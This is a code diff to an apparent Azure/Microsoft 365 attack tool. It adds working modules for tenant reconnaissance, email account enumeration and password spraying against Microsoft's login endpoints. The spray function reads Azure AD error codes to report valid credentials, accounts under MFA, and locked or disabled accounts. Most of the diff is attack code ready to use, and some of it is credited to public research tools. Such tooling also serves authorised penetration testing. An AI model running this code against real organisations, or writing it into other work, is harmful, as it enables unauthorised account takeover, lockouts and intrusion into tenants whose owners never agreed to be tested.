@@ -11,7 +11,7 @@ from urllib.parse import urlparse
 from xml.dom.minidom import parse
 from xml.dom.minidom import parseString
 import xml.dom.minidom
-import ssl
+import ssl, re
 
 Token = None
 accessTokenGraph = None
@@ -87,6 +87,31 @@ def sendGETRequest(url, Token):
         pass
     return object
 
+
+def sendPOSTRequestXMLAutoDiscover(url, body):
+    object = {}
+    o = urlparse(url)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        "Content-Type" : "text/xml; charset=utf-8",
+        "SOAPAction" :   '"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"',
+        "User-Agent" :   "AutodiscoverClient"
+    }
+    conn.request("POST", str(o.path) + "/?" + str(o.query), body.encode('utf-8'), headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
+
 def sendPOSTRequest(url, body, Token):
     object = {}
     o = urlparse(url)
@@ -110,6 +135,40 @@ def sendPOSTRequest(url, body, Token):
     except json.JSONDecodeError:
         pass
     return object
+
+
+def sendPOSTRequestSprayMSOL(url, user, pwd):
+    object = {}
+    o = urlparse(url)
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    conn = http.client.HTTPSConnection(o.netloc)
+    headers = {
+        'Accept': 'application/json',
+        'Content-Type': 'application/x-www-form-urlencoded'
+    }
+    data = {
+        'resource': 'https://graph.windows.net',
+        'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
+        'client_info': '1',
+        'grant_type': 'password',
+        'username': user,
+        'password': pwd,
+        'scope': 'openid'
+    }
+    qs = urllib.parse.urlencode(data)
+    conn.request("POST", str(o.path) + "/?" + str(o.query), qs, headers)
+    res = conn.getresponse()
+    object["headers"] = dict(res.getheaders())
+    object["status_code"] = int(res.status)
+    object["response"] = str(res.read().decode("utf-8"))
+    try:
+        object["json"] = json.loads(object["response"])
+    except json.JSONDecodeError:
+        pass
+    return object
+
 def sendPUTRequest(url, body, Token):
     object = {}
     o = urlparse(url)
@@ -254,6 +313,86 @@ def RD_ListAllVMs():
                 item['subscriptionId'] = sub['subscriptionId']
                 item['resourceGroup'] = res['name']
                 result.append(item)
+    return result
+
+def ENUM_MSOLSpray(username,password):
+    r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", username, password)
+    if r["status_code"] == 200:
+        return True
+    else:
+        error = r["response"]
+        if "AADSTS50126" in error:
+            return "Invalid password."
+        elif "AADSTS50128" in error or "AADSTS50059" in error:
+            return "Tenant for account doesn't exist. Check the domain to make sure they are using Azure/O365 services."
+        elif "AADSTS50034" in error:
+            return "The user doesn't exist."
+        elif "AADSTS50079" in error or "AADSTS50076" in error:
+            return "Credential valid however the response indicates MFA (Microsoft) is in use."
+        elif "AADSTS50158" in error:
+            return "Credential valid however the response indicates conditional access (MFA: DUO or other) is in use."
+        elif "AADSTS50053" in error:
+            return "The account appears to be locked."
+        elif "AADSTS50057" in error:
+            return "The account appears to be disabled."
+        elif "AADSTS50055" in error:
+            return "Credential valid however the user's password is expired."
+        else:
+            return "Got unknown error"
+
+
+''' Based on AADInternals Research (https://aadinternals.com/post/just-looking/) '''
+
+def ENUM_Tenant_Info(domain):
+    r = sendGETRequest("https://login.microsoftonline.com/"+domain+"/.well-known/openid-configuration", None)
+    return r["json"]
+
+def ENUM_Tenant_Login_Info(domain):
+    r = sendGETRequest("https://login.microsoftonline.com/getuserrealm.srf?login=" + domain + "&xml=1", None)
+    DOMTree = xml.dom.minidom.parseString(r["response"])
+    RealmInfo = DOMTree.getElementsByTagName("RealmInfo")
+    return RealmInfo
+
+def ENUM_Tenant(domain):
+    autodiscover_post_body = """<?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
+        <soap:Header>
+            <a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation</a:Action>
+            <a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc</a:To>
+            <a:ReplyTo>
+                <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
+            </a:ReplyTo>
+        </soap:Header>
+        <soap:Body>
+            <GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover">
+                <Request>
+                    <Domain>""" + domain + """</Domain>
+                </Request>
+            </GetFederationInformationRequestMessage>
+        </soap:Body>
+    </soap:Envelope>"""
+    r = sendPOSTRequestXMLAutoDiscover("https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc", autodiscover_post_body)
+    result = []
+    DomainIntel = ENUM_Tenant_Info(domain)
+    DOMTree = xml.dom.minidom.parseString(r["response"])
+    domains = DOMTree.getElementsByTagName("Domain")
+    for domain in domains:
+        currentDomain = domain.firstChild.data
+        dataIntel = ENUM_Tenant_Login_Info(currentDomain)
+        for intel in dataIntel:
+            NameSpaceType = intel.getElementsByTagName("NameSpaceType")[0].childNodes[0].nodeValue
+            IsFederatedNS = intel.getElementsByTagName("IsFederatedNS")[0].childNodes[0].nodeValue
+            FederationBrandName = intel.getElementsByTagName("FederationBrandName")[0].childNodes[0].nodeValue
+            CloudInstanceName = intel.getElementsByTagName("CloudInstanceName")[0].childNodes[0].nodeValue
+            result.append({
+                'Location': DomainIntel['tenant_region_scope'],
+                'domain': currentDomain,
+                'NSType': NameSpaceType,
+                'FederationBrandName': FederationBrandName,
+                'IsFederatedNS': bool(IsFederatedNS),
+                'TenantId': re.findall("[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", DomainIntel['token_endpoint'])[0],
+                'CloudName': CloudInstanceName
+            })
     return result
 
 def ContainerACL(storageAccount):
@@ -1063,6 +1202,9 @@ def attackWindow():
     exploits = [
         "Token/GenToken",
         "Token/SetToken",
+        "External/OSINT",
+        "External/EmailEnum",
+        "External/PasswordSpray",
         "Reader/ListAllUsers",
         "Reader/ExposedAppServiceApps",
         "Reader/ListAllAzureContainerRegistry",
@@ -1310,13 +1452,16 @@ def attackWindow():
                     if checkExploitInital[1] not in exploits:
                         print("Not supported exploit. Supported exploits: " + str(exploits))
                     else:
-                        if hasTokenInPlace():
+                        if "External/" in checkExploitInital[1]:
                             ExploitChoosen = argExpSub
                         else:
-                            if "Token/" in checkExploitInital[1]:
+                            if hasTokenInPlace():
                                 ExploitChoosen = argExpSub
                             else:
-                                print("Please set target victim access token. Use Token/* exploits.")
+                                if "Token/" in checkExploitInital[1]:
+                                    ExploitChoosen = argExpSub
+                                else:
+                                    print("Please set target victim access token. Use Token/* exploits.")
             elif mode == "back" or mode == "exit":
                 if ExploitChoosen is not None:
                     ExploitChoosen = None
@@ -1530,6 +1675,67 @@ def attackWindow():
                             })
                         armRecordCount += 1
                     print(make_table(field_names, rows))
+            elif "External/OSINT" in ExploitChoosen and mode == "run":
+                target = input("Enter target domain [i.e. example.com]: ")
+                field_names = ["#", "Domain", "Location", "Type"]
+                rows = []
+                subRecordCount = 0
+                tenantName = ""
+                tenantId = ""
+                if len(ENUM_Tenant(target)) == 0:
+                    print("The domain " + target + " has no Azure Tenant detected. Abort.")
+                else:
+                    print("Starting on domain " + target + "...")
+                    for domain in ENUM_Tenant(target):
+                        rows.append(
+                            {"#": subRecordCount, "Domain": domain['domain'],
+                             "Location": domain['Location'], "Type": domain['NSType']
+                             })
+                        tenantId = domain["TenantId"]
+                        tenantName = domain['FederationBrandName']
+                        subRecordCount += 1
+                    print("\nTenant Name: " + tenantName)
+                    print("Tenant Id: " + tenantId)
+                    print("Found " + str(subRecordCount) + " total valid domains:")
+                    print(make_table(field_names, rows))
+                    print("Operation Completed.")
+            elif "External/EmailEnum" in ExploitChoosen and mode == "run":
+                DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
+                for target in open(os.path.normpath(DestPath), 'r').readlines():
+                    technique = int(input("Choose enum method [1=O365Office, 2=OAuth2]: "))
+                    if technique > 2 or technique < 1:
+                        print("Please choose valid method.")
+                    else:
+                        if technique == 1:
+                            ' based on o365creeper to enumerate via O365 Office API https://github.com/LMGsec/o365creeper'
+                            body = {"username": target.strip()}
+                            r = sendPOSTRequest("https://login.microsoftonline.com/common/GetCredentialType", body, None)
+                            if '"IfExistsResult":1' in r["response"]:
+                                print("The email " + target.strip() + " not found")
+                            else:
+                                print("The email " + target.strip() + " VALID!")
+                        if technique == 2:
+                            ' based on MSOLSpray method by @dafthack '
+                            r = sendPOSTRequestSprayMSOL("https://login.microsoft.com/common/oauth2/token", target.strip(),"a123456")
+                            error = r["response"]
+                            if "AADSTS50034" in error:
+                                print("The email " + target.strip() + " not found")
+                            else:
+                                print("The email " + target.strip() + " VALID!")
+                    print("Completed Operation.")
+            elif "External/PasswordSpray" in ExploitChoosen and mode == "run":
+                Password = input("Please enter password to spray [i.e. Winter2020]: ")
+                DestPath = input("Please enter the path for emails [i.e. C:\\emails.txt]: ")
+                print("Trying each target with password = " + str(Password) + "...")
+                for target in open(os.path.normpath(DestPath), 'r').readlines():
+                    chk = ENUM_MSOLSpray(target.strip(), Password)
+                    if chk is True:
+                        print("Found valid account: " + target.strip() + " / " + Password + "")
+                    else:
+                        if 'Invalid password.' in chk:
+                            continue
+                        print(chk)
+                print("Completed Operation.")
             elif "Reader/ListAllUsers" in ExploitChoosen and mode == "run":
                 print("Trying to list all users.. (it might take a few minutes)")
                 field_names = ["#", "DisplayName", "First", "Last", "mobilePhone", "mail", "userPrincipalName"]
